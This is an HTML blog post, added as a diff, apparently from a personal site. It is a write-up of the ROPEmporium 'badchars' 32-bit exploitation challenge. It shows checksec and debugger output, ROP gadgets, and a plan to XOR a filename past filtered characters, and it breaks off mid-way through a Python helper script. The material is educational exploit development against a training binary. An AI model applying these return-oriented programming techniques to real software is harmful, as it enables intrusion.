@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="Hugo 0.92.2" />
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="" />
+  <meta property="og:url" content="http://example.org/posts/badchars32/" />
+  <link rel="canonical" href="http://example.org/posts/badchars32/" /><link rel="alternate" type="application/atom+xml" href="http://example.org/index.xml" title="My New Hugo Site">
+
+  <script type="application/ld+json">
+  {
+      "@context" : "http://schema.org",
+      "@type" : "BlogPosting",
+      "mainEntityOfPage": {
+           "@type": "WebPage",
+           "@id": "http:\/\/example.org\/"
+      },
+      "articleSection" : "posts",
+      "name" : "ROPEmporium: badchars 32-bit",
+      "headline" : "ROPEmporium: badchars 32-bit",
+      "description" : "Writeup of bad characters [badchars] on ROPEmporium Prerequisites: Knowledge from previous challs, XOR (Exclusive Or)\n This was a more difficult exploit to create, due to the fact that we had bad characters\nAs usual I started checking the security settings on the binary provided\ncave@noobpwn:~\/binexp\/ROP-emperium\/badchars_32$ checksec badchars32 [*] \u0026#39;\/home\/cave\/binexp\/ROP-emperium\/badchars_32\/badchars32\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) RUNPATH: b\u0026#39;.\u0026#39; We see that there is NX enabled.",
+      "inLanguage" : "en-US",
+      "author" : "",
+      "creator" : "",
+      "publisher": "",
+      "accountablePerson" : "",
+      "copyrightHolder" : "",
+      "copyrightYear" : "2021",
+      "datePublished": "2021-05-24 19:58:00 \u002b0200 CEST",
+      "dateModified" : "2021-05-24 19:58:00 \u002b0200 CEST",
+      "url" : "http:\/\/example.org\/posts\/badchars32\/",
+      "keywords" : [  ]
+  }
+</script>
+<title>ROPEmporium: badchars 32-bit</title>
+  <meta property="og:title" content="ROPEmporium: badchars 32-bit" />
+  <meta property="og:type" content="article" />
+  <meta property="og:description" content="Writeup of bad characters [badchars] on ROPEmporium Prerequisites: Knowledge from previous challs, XOR (Exclusive Or)
+ This was a more difficult exploit to create, due to the fact that we had bad characters
+As usual I started checking the security settings on the binary provided
+cave@noobpwn:~/binexp/ROP-emperium/badchars_32$ checksec badchars32 [*] &amp;#39;/home/cave/binexp/ROP-emperium/badchars_32/badchars32&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) RUNPATH: b&amp;#39;.&amp;#39; We see that there is NX enabled." />
+  <meta name="description" content="Writeup of bad characters [badchars] on ROPEmporium Prerequisites: Knowledge from previous challs, XOR (Exclusive Or)
+ This was a more difficult exploit to create, due to the fact that we had bad characters
+As usual I started checking the security settings on the binary provided
+cave@noobpwn:~/binexp/ROP-emperium/badchars_32$ checksec badchars32 [*] &amp;#39;/home/cave/binexp/ROP-emperium/badchars_32/badchars32&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) RUNPATH: b&amp;#39;.&amp;#39; We see that there is NX enabled." />
+  <meta property="og:locale" content="en-us" /><meta property="og:image" content="" />
+  
+
+  
+    <style>body{font-family:bree serif,sans-serif;-webkit-font-smoothing:antialiased;margin:0 20px}article{max-width:800px;margin-left:auto;margin-right:auto}a{color:#000;text-decoration:none}a:hover{font-weight:600;text-decoration:underline}.post-ads{margin:50px 0}.markdown-body{font-size:18px;max-width:100%}.markdown-body a{text-decoration:underline;text-decoration-color:#000}.markdown-body blockquote{margin:0;padding:0 1em;color:#57606a;border-left:.25em solid #d0d7de}.markdown-body pre{padding:16px;overflow:auto;border-radius:10px}.markdown-body code{padding:.2em .4em;font-size:85%;background-color:#f6f8fa;border-radius:6px}.markdown-body pre>code{padding:0;font-size:100%;background-color:inherit;border:0}.Chinese .markdown-body{line-height:200%}.site-date-catalog{font-size:2rem}.header-title{font-size:2rem;font-weight:700;margin-top:32px;font-family:bungee shade,sans-serif}.header-title a{text-decoration:none}.header-subtitle{color:#666}.header-items{margin:10px 0}.header-item{margin:0 5px}.header-line{width:100%;border-width:2px;border-color:#482936;border-style:solid none none none}.lang-switch{font-weight:600}#posts-list{min-height:600px}.posts-line{font-size:1.2rem;margin:12px 0}.posts-categories{font-size:.8rem;margin:auto;text-align:center}.posts-category{padding:3px 0;border:#000 2px solid;border-radius:5px}.site-footer{margin-top:50px}.site-footer-item{margin-right:12px}.post-content img{max-width:100%;display:block;margin-right:auto;margin-top:12px}.post-header{margin-bottom:50px}.post-title{font-size:2rem;font-weight:600}.post-tags{display:inline;font-weight:600;padding:2px 5px;margin-right:6px;border:#000 2px solid;border-radius:5px}.post-date{font-weight:800;font-style:italic}.post-author{float:right;font-weight:600}.page-content{min-height:60%}.post-content{margin-bottom:50px}.post-content p{hyphens:auto;line-height:1.8;text-justify:ideographic;margin-bottom:1em}.related-content{border-width:3px;border-style:solid;border-color:#000;padding:0 10px;margin-bottom:50px;margin-top:100px}.related-content li{margin:5px 0}.taxonomy-term{font-size:3rem}.gallery-img{text-align:center}.gallery-img span{text-align:center}.gallery-img-desc{font-size:.8em;font-weight:800}#disqus_thread{position:relative}#disqus_thread:after{content:"";display:block;height:55px;width:100%;position:absolute;bottom:0;background:#fff}@media screen and (max-width:600px){.header-title,.header-subtitle,.header-items{text-align:center}.posts-line{font-size:16px}.markdown-body{font-size:16px}.post-title{font-size:2rem}.post-content p{letter-spacing:.05em}}@media screen and (max-width:48em){.posts-category{display:none}}</style>
+  
+  
+    <style>.container,.container-fluid{margin-right:auto;margin-left:auto}.container-fluid{padding-right:2rem;padding-left:2rem}.row{box-sizing:border-box;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-flex:0;-ms-flex:0 1 auto;flex:initial;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-.5rem;margin-left:-.5rem}.row.reverse{-webkit-box-orient:horizontal;-webkit-box-direction:reverse;-ms-flex-direction:row-reverse;flex-direction:row-reverse}.col.reverse{-webkit-box-orient:vertical;-webkit-box-direction:reverse;-ms-flex-direction:column-reverse;flex-direction:column-reverse}.col-xs,.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9,.col-xs-offset-0,.col-xs-offset-1,.col-xs-offset-10,.col-xs-offset-11,.col-xs-offset-12,.col-xs-offset-2,.col-xs-offset-3,.col-xs-offset-4,.col-xs-offset-5,.col-xs-offset-6,.col-xs-offset-7,.col-xs-offset-8,.col-xs-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-xs{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-xs-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-xs-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-xs-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-xs-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-xs-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-xs-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-xs-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-xs-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-xs-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-xs-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-xs-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-xs-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-xs-offset-0{margin-left:0}.col-xs-offset-1{margin-left:8.33333333%}.col-xs-offset-2{margin-left:16.66666667%}.col-xs-offset-3{margin-left:25%}.col-xs-offset-4{margin-left:33.33333333%}.col-xs-offset-5{margin-left:41.66666667%}.col-xs-offset-6{margin-left:50%}.col-xs-offset-7{margin-left:58.33333333%}.col-xs-offset-8{margin-left:66.66666667%}.col-xs-offset-9{margin-left:75%}.col-xs-offset-10{margin-left:83.33333333%}.col-xs-offset-11{margin-left:91.66666667%}.start-xs{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-xs{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-xs{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-xs{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-xs{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-xs{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-xs{-ms-flex-pack:distribute;justify-content:space-around}.between-xs{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-xs{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-xs{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}@media only screen and (min-width:48em){.container{width:49rem}.col-sm,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-offset-0,.col-sm-offset-1,.col-sm-offset-10,.col-sm-offset-11,.col-sm-offset-12,.col-sm-offset-2,.col-sm-offset-3,.col-sm-offset-4,.col-sm-offset-5,.col-sm-offset-6,.col-sm-offset-7,.col-sm-offset-8,.col-sm-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-sm{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-sm-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-sm-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-sm-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-sm-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-sm-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-sm-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-sm-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-sm-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-sm-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-sm-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-sm-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-sm-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-sm-offset-0{margin-left:0}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-11{margin-left:91.66666667%}.start-sm{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-sm{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-sm{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-sm{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-sm{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-sm{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-sm{-ms-flex-pack:distribute;justify-content:space-around}.between-sm{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-sm{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-sm{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:64em){.container{width:65rem}.col-md,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-offset-0,.col-md-offset-1,.col-md-offset-10,.col-md-offset-11,.col-md-offset-12,.col-md-offset-2,.col-md-offset-3,.col-md-offset-4,.col-md-offset-5,.col-md-offset-6,.col-md-offset-7,.col-md-offset-8,.col-md-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-md{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-md-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-md-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-md-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-md-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-md-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-md-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-md-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-md-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-md-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-md-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-md-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-md-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-md-offset-0{margin-left:0}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-3{margin-left:25%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-6{margin-left:50%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-9{margin-left:75%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-11{margin-left:91.66666667%}.start-md{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-md{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-md{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-md{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-md{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-md{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-md{-ms-flex-pack:distribute;justify-content:space-around}.between-md{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-md{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-md{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:75em){.container{width:76rem}.col-lg,.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-lg-offset-0,.col-lg-offset-1,.col-lg-offset-10,.col-lg-offset-11,.col-lg-offset-12,.col-lg-offset-2,.col-lg-offset-3,.col-lg-offset-4,.col-lg-offset-5,.col-lg-offset-6,.col-lg-offset-7,.col-lg-offset-8,.col-lg-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-lg{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-lg-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-lg-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-lg-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-lg-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-lg-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-lg-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-lg-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-lg-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-lg-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-lg-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-lg-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-lg-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-lg-offset-0{margin-left:0}.col-lg-offset-1{margin-left:8.33333333%}.col-lg-offset-2{margin-left:16.66666667%}.col-lg-offset-3{margin-left:25%}.col-lg-offset-4{margin-left:33.33333333%}.col-lg-offset-5{margin-left:41.66666667%}.col-lg-offset-6{margin-left:50%}.col-lg-offset-7{margin-left:58.33333333%}.col-lg-offset-8{margin-left:66.66666667%}.col-lg-offset-9{margin-left:75%}.col-lg-offset-10{margin-left:83.33333333%}.col-lg-offset-11{margin-left:91.66666667%}.start-lg{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-lg{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-lg{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-lg{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-lg{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-lg{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-lg{-ms-flex-pack:distribute;justify-content:space-around}.between-lg{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-lg{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-lg{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}</style>
+  
+
+  
+
+  <link href="/index.xml" rel="alternate" type="application/rss+xml"
+    title="My New Hugo Site">
+  
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
+  
+  
+
+  
+  
+</head>
+
+
+<body>
+  <article class="post " id="article">
+    <div class="row">
+      <div class="col-xs-12">
+        <div class="site-header">
+          
+<header>
+  <div class="header-title">
+    <a href="/"
+      >cavefx</a
+    >
+  </div>
+  <div class="header-subtitle"></div>
+</header>
+<div class="row end-md center-xs header-items">
+  
+  <div class="header-item">
+    <a href="/about" target="_blank">About Me</a>
+  </div>
+  
+</div>
+<div class="row end-xs">
+   
+</div>
+<div class="header-line"></div>
+
+        </div>
+        <header class="post-header">
+          <h1 class="post-title">ROPEmporium: badchars 32-bit</h1>
+          
+          <div class="row post-desc">
+            <div class="col-xs-6">
+              
+              <time class="post-date" datetime="2021-05-24 19:58:00 CEST">
+                24 May 2021
+              </time>
+              
+            </div>
+            <div class="col-xs-6">
+              
+            </div>
+          </div>
+          
+        </header>
+
+        <div class="post-content markdown-body">
+          
+          <h1 id="writeup-of-bad-characters-badchars-on-ropemporium">Writeup of bad characters [badchars] on ROPEmporium</h1>
+<p>Prerequisites: Knowledge from previous challs, XOR (Exclusive Or)</p>
+<hr>
+<p>This was a more difficult exploit to create, due to the fact that we had bad characters</p>
+<p>As usual I started checking the security settings on the binary provided</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">cave<span style="color:#960050;background-color:#1e0010">@</span>noobpwn:<span style="color:#f92672">~/</span>binexp<span style="color:#f92672">/</span>ROP<span style="color:#f92672">-</span>emperium<span style="color:#f92672">/</span>badchars_32<span style="color:#960050;background-color:#1e0010">$</span> checksec badchars32
+
+[<span style="color:#f92672">*</span>] <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>cave<span style="color:#f92672">/</span>binexp<span style="color:#f92672">/</span>ROP<span style="color:#f92672">-</span>emperium<span style="color:#f92672">/</span>badchars_32<span style="color:#f92672">/</span>badchars32<span style="color:#960050;background-color:#1e0010">&#39;</span>
+    Arch:     i386<span style="color:#f92672">-</span><span style="color:#ae81ff">32</span><span style="color:#f92672">-</span>little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (<span style="color:#ae81ff">0x8048000</span>)
+    RUNPATH:  b<span style="color:#e6db74">&#39;.&#39;</span>
+</code></pre></div><p>We see that there is NX enabled.</p>
+<p>Next we run the program. I get the output &ldquo;badchars are: &lsquo;x&rsquo;, &lsquo;g&rsquo;, &lsquo;a&rsquo;, &lsquo;.&rsquo;</p>
+<p>These are the characters we want to avoid. We want to read the file &ldquo;flag.txt&rdquo;, which has all of the bad characters present. Fuck.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">pwndbg<span style="color:#f92672">&gt;</span> info functions
+Non<span style="color:#f92672">-</span>debugging symbols:
+<span style="color:#ae81ff">0x080483b0</span>  pwnme<span style="color:#960050;background-color:#1e0010">@</span>plt
+<span style="color:#ae81ff">0x080483d0</span>  print_file<span style="color:#960050;background-color:#1e0010">@</span>plt
+<span style="color:#ae81ff">0x080483f0</span>  _start
+<span style="color:#ae81ff">0x08048506</span>  main
+<span style="color:#ae81ff">0x0804852a</span>  usefulFunction
+<span style="color:#ae81ff">0x08048543</span>  usefulGadgets
+</code></pre></div><p>The usefulGadgets are at 0x08048543. Let&rsquo;s disassemble that!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">pwndbg<span style="color:#f92672">&gt;</span> disass <span style="color:#ae81ff">0x08048543</span>
+Dump of assembler code <span style="color:#66d9ef">for</span> function usefulGadgets:
+   <span style="color:#ae81ff">0x08048543</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;:</span> add    BYTE PTR [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">0x0</span>],bl
+   <span style="color:#ae81ff">0x08048546</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">3</span><span style="color:#f92672">&gt;:</span> ret    
+   <span style="color:#ae81ff">0x08048547</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;:</span> xor    BYTE PTR [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">0x0</span>],bl
+   <span style="color:#ae81ff">0x0804854a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">7</span><span style="color:#f92672">&gt;:</span> ret    
+   <span style="color:#ae81ff">0x0804854b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;:</span> sub    BYTE PTR [ebp<span style="color:#f92672">+</span><span style="color:#ae81ff">0x0</span>],bl
+   <span style="color:#ae81ff">0x0804854e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;:</span>    ret    
+   <span style="color:#ae81ff">0x0804854f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">12</span><span style="color:#f92672">&gt;:</span>    mov    DWORD PTR [edi],esi
+   <span style="color:#ae81ff">0x08048551</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">14</span><span style="color:#f92672">&gt;:</span>    ret    
+End of assembler dump.
+pwndbg<span style="color:#f92672">&gt;</span> 
+</code></pre></div><p>*Data been removed for readability</p>
+<p>In the description of the challenge on the site, it said something along the lines of &ldquo;Maybe you could change the string, once it is in memory?&rdquo;</p>
+<p>I wanted to use the xor gadget for this, because I couldn&rsquo;t quite wrap my head around how I should use the add or sub gadgets.
+We&rsquo;re also given the &ldquo;mov DWORD ptr [edi],  esi&rdquo;. What this gadget does is move the value of esi into the address of edi.</p>
+<p>We need a few more gadgets before we can start planning our ROPchain. We need a gadget to control esi, and edi.</p>
+<p>I tried to use ropper, but gave up and just used what I was comfortable with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">cave<span style="color:#960050;background-color:#1e0010">@</span>noobpwn:<span style="color:#f92672">~/</span>binexp<span style="color:#f92672">/</span>ROP<span style="color:#f92672">-</span>emperium<span style="color:#f92672">/</span>badchars_32<span style="color:#960050;background-color:#1e0010">$</span> ROPgadget <span style="color:#f92672">--</span>binary badchars32 <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;pop esi&#34;</span>
+
+<span style="color:#ae81ff">0x080485b9</span> <span style="color:#f92672">:</span> pop esi ; pop edi ; pop ebp ; ret
+</code></pre></div><p>Another useful gadget, but do we don&rsquo;t need the &ldquo;pop ebp&rdquo;, so we&rsquo;ll just fill that with garbage</p>
+<p>Gadgets I want to use:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">xor byte ptr [ebp],bl
+mov dword ptr [edi], esi
+pop esi, pop edi, pop ebp
+pop ebp (to set addr <span style="color:#66d9ef">for</span> xor)
+pop ebx (to set bl <span style="color:#66d9ef">for</span> xor)
+</code></pre></div><p>I also needed to check what addresspaces were writable, otherwise I couldn&rsquo;t write my string anywhere. I did this with radare2 and the iS function. You can also use readelf -S <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">addr          vsize       name  
+<span style="color:#ae81ff">0x08049efc</span>    <span style="color:#ae81ff">0x4</span> <span style="color:#f92672">-</span>rw<span style="color:#f92672">-</span> .init_array
+<span style="color:#ae81ff">0x08049f00</span>    <span style="color:#ae81ff">0x4</span> <span style="color:#f92672">-</span>rw<span style="color:#f92672">-</span> .fini_array
+<span style="color:#ae81ff">0x08049f04</span>   <span style="color:#ae81ff">0xf8</span> <span style="color:#f92672">-</span>rw<span style="color:#f92672">-</span> .dynamic
+<span style="color:#ae81ff">0x08049ffc</span>    <span style="color:#ae81ff">0x4</span> <span style="color:#f92672">-</span>rw<span style="color:#f92672">-</span> .got
+<span style="color:#ae81ff">0x0804a000</span>   <span style="color:#ae81ff">0x18</span> <span style="color:#f92672">-</span>rw<span style="color:#f92672">-</span> .got.plt
+<span style="color:#ae81ff">0x0804a018</span>    <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">-</span>rw<span style="color:#f92672">-</span> .data
+<span style="color:#ae81ff">0x0804a020</span>    <span style="color:#ae81ff">0x4</span> <span style="color:#f92672">-</span>rw<span style="color:#f92672">-</span> .bss
+</code></pre></div><p>Now I was ready to plan my ROPchain.</p>
+<p>I planned my masterplan:</p>
+<pre tabindex="0"><code>Step 1. Move a string into a writeable datasegment
+
+Step 2. XOR the string bytewise, so that its equal to flag
+
+Step 3. Do step 1, but with .txt
+
+Step 4. Call useFunc, printfile@plt 
+
+Step 5. ?????
+
+Step 6. Profit
+</code></pre><p>This proved to be more difficult that I had wanted. I first wrote a small python script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">badChars<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;x&#34;</span>,<span style="color:#e6db74">&#34;g&#34;</span>,<span style="color:#e6db74">&#34;a&#34;</span>,<span style="color:#e6db74">&#34;.&#34;</span>]
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xory</span>(string):
+    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">3</span>):
+        chars<span style="color:#f92672">=</span>[]
+        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> string:
+            a <span style="color:#f92672">=</span> chr(ord(i)<span style="color:#f92672">^</span>x)
+            <span style="color:#66d9ef">if</span> a <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> badChars:
+                chars<span style="color:#f92672">.</span>append(a)
+                <span style="color:#66d9ef">if</span> len(chars)<span style="color:#f92672">==</span><span style="color:#ae81ff">4</span>:
